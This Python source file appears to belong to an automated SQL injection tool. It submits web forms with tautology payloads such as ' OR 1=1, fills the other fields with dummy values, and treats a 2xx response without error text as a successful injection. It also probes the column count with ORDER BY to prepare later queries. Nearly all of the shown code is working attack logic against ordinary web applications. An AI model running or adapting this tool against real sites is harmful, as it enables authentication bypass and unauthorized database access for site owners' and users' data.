import logging
import urllib.parse
from abc import ABC

import requests
from src.sql_injection_builder import SQLInjectionBuilder

class SQLInjectorState(ABC):
    injections_to_try = ("' OR 1=1", " OR 1=1", "' OR 1=\"1\"", " OR 1=\"1\"")

    def __init__(self, sql_injector) -> None:
        self.sql_injector = sql_injector

    def next(self):
        pass

    def inject(self, action, input_chosen, inputs):
        pass

    def isEnd(self):
        return False

    def injection(self, action, input_chosen, inputs, sql_injection_string):
        default_values = {None: "a",
                          "text": "random text",
                          "password": "456QWdsa!gios",
                          "email": "valid@gmail.com",
                          "number": 5}

        if input_chosen.type == "submit":
            return
        data = {input_chosen.name: sql_injection_string}
        for input_ in inputs:
            if input_ == input_chosen or input_.type == "submit":
                continue
            dummy_value = input_.value
            if dummy_value is None:
                dummy_value = default_values.get(input_.type, "laralalarala")
            data[input_.name] = dummy_value
        response = self.http_request_inject(self.sql_injector.method, action, data)
        if 200 <= response.status_code <= 300 and all([r not in response.text for r in ("ERROR:", "Access dennied:", "Authentication failed")]):
            logging.info(f"\033[0;32m{response.status_code} - Valid injection with: {data}\033[0m")
            return response
        else:
            logging.error(f"\033[1;31m{response.status_code} - Could not resolve injection with {data}, found error on response - {[r not in response.text for r in ('ERROR:', 'Access dennied:', 'Authentication failed')]}\033[0m")
            return None

    def http_request_inject(self, method, url, data=None):
        if method == "get":
            if data is None:
                response = requests.get(url)
            else:
                response = requests.get(f"{url}?{urllib.parse.urlencode(data)}")
        elif method == "post":
            response = requests.post(url, data=data)
        return response

    def get_number_of_columns(self, action, input_chosen, inputs, previous_str):
        for i in range(1, 10):
            str_version = SQLInjectionBuilder().add_str(previous_str).order_by(i).build()
            response = self.injection(action, input_chosen, inputs, str_version)
            if response == None:
                return i
        return None